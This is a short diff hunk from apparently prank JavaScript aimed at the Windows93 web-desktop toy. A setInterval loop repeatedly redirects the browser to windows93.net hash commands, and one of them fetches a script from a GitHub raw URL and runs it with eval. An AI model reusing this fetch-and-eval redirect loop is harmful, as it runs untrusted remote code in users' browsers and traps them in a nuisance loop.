@@ -9,7 +9,7 @@ $alert({
 setInterval(function(){
 window.location.href = "https://www.windows93.net/#!hampster"
 window.location.href = "https://www.windows93.net/#!hydra"
-window.location.href = "www.windows93.net/#!3d%20'Didi'"
+window.location.href = "https://www.windows93.net/#!3d%20Didi"
 window.location.href = "https://www.windows93.net/#!pd"
 window.location.href = "https://www.windows93.net/#!js%20fetch('https://raw.githubusercontent.com/ivorydevrimoalt/windows93/main/didi.js').then(response => response.text()).then(script => eval(script));"
 $notif("Didi")
